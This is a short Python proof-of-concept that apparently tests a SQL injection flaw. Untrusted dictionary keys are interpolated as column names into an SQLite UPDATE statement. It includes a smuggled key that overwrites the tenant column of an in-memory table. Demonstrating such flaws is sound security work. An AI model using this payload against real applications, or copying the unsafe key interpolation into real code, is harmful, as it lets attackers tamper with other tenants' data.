import sqlite3

conn = sqlite3.connect(':memory:')
conn.execute("CREATE TABLE test (id TEXT, name TEXT, tenant TEXT, project_id TEXT)")
conn.execute("INSERT INTO test (id, name, tenant, project_id) VALUES ('1', 'old_name', 't1', 'p1')")

updates = {"name = 'hacked' --": "value"}
set_clause = ", ".join([f"{k} = ?" for k in updates.keys()])
# This generates: UPDATE test SET name = 'hacked' -- = ? WHERE id = ? AND tenant = ? AND project_id = ?

# We need to construct a valid injection.
# Suppose updates = {"name": "val", "tenant = 'hacked', project_id": "val2"}
# UPDATE test SET name = ?, tenant = 'hacked', project_id = ? WHERE id = ? ...

updates2 = {"name": "new_name", "tenant = 'hacked', project_id": "val2"}
set_clause2 = ", ".join([f"{k} = ?" for k in updates2.keys()])
params2 = list(updates2.values()) + ['1', 't1', 'p1']
print(f"UPDATE test SET {set_clause2} WHERE id = ? AND tenant = ? AND project_id = ?")

try:
    cur = conn.execute(f"UPDATE test SET {set_clause2} WHERE id = ? AND tenant = ? AND project_id = ?", params2)
    print("Rowcount:", cur.rowcount)

    cur = conn.execute("SELECT * FROM test")
    print("Rows:", cur.fetchall())
except Exception as e:
    print("Error:", e)
